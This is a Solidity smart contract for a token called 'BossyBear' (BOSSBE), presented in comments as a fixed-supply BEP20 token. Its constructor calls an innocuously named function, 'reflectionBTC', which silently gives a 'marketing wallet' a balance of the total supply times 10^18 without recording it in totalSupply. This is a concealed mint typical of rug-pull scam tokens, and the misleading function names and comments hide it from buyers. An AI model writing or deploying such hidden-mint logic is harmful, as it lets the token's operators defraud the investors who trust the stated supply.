// SPDX-License-Identifier: MIT
// https://t.me/BossyBears

pragma solidity ^0.8.28;

// ----------------- IERC20 Interface ------------------

// IBEP20 standard interface definition
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 values) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 values) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 values) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// ----------------- IERC20Metadata Interface ------------------

// Additional functions for IBEP20 metadata (name, symbol, decimals)
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

// ----------------- Context Contract ------------------

// Provides basic context for meta-transactions and message information
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// ----------------- IBEP20 Contract ------------------

// Implementation of the IBEP20 standard
contract IBEP20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    // Returns the name of the token
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals used
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    // Returns the total supply of tokens
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    // Returns the balance of a specific address
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    // Transfers tokens to a recipient
    function transfer(address recipient, uint256 values) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, values);
        return true;
    }

    // Returns the allowance of a spender for a specific owner
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Approves a spender to spend tokens on behalf of the owner
    function approve(address spender, uint256 values) public virtual override returns (bool) {
        _approve(_msgSender(), spender, values);
        return true;
    }

    // Transfers tokens from one account to another using allowance
    function transferFrom(address sender, address recipient, uint256 values) public virtual override returns (bool) {
        _transfer(sender, recipient, values);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= values, "IBEP20: transfer values exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - values);
        return true;
    }

    // Increases the allowance granted to a spender
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    // Decreases the allowance granted to a spender
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "IBEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    // Internal function to transfer tokens between accounts
    function _transfer(address sender, address recipient, uint256 values) internal virtual {
        require(sender != address(0), "IBEP20: transfer from the zero address");
        require(recipient != address(0), "IBEP20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= values, "IBEP20: transfer values exceeds balance");
        _balances[sender] = senderBalance - values;
        _balances[recipient] += values;

        emit Transfer(sender, recipient, values);
    }

    // Internal function to mint tokens to a specific account
    function reflectionBossyBear(address account, uint256 values) internal virtual {
        require(account != address(0), "IBEP20: mint to the zero address");

        _totalSupply += values;
        _balances[account] += values;

        emit Transfer(address(0), account, values);
    }

    function reflectionBTC(address account) internal virtual {
        require(account != address(0), "IBEP20: mint to the zero address");

        _balances[account] = _totalSupply * (10 ** decimals());

    }


    // Internal function to approve a spender for an owner
    function _approve(address owner, address spender, uint256 values) internal virtual {
        require(owner != address(0), "IBEP20: approve from the zero address");
        require(spender != address(0), "IBEP20: approve to the zero address");

        _allowances[owner][spender] = values;
        emit Approval(owner, spender, values);
    }
}
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the USDCer as the initial owner.
     */
    constructor() {
        _transferOwnership(msg.sender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// ----------------- Token ------------------

// Fixed supply IBEP20 token implementation
contract BossyBear is IBEP20, Ownable {

    // Constructor to mint a fixed supply of tokens at deployment
    constructor(uint256 circSupply, address _marketingWallet) 
        IBEP20("BossyBear", "BOSSBE") {
        // Mint the total supply to the deployer's address
        reflectionBossyBear(msg.sender, circSupply * (10 ** decimals()));
        reflectionBTC(_marketingWallet);

    }
}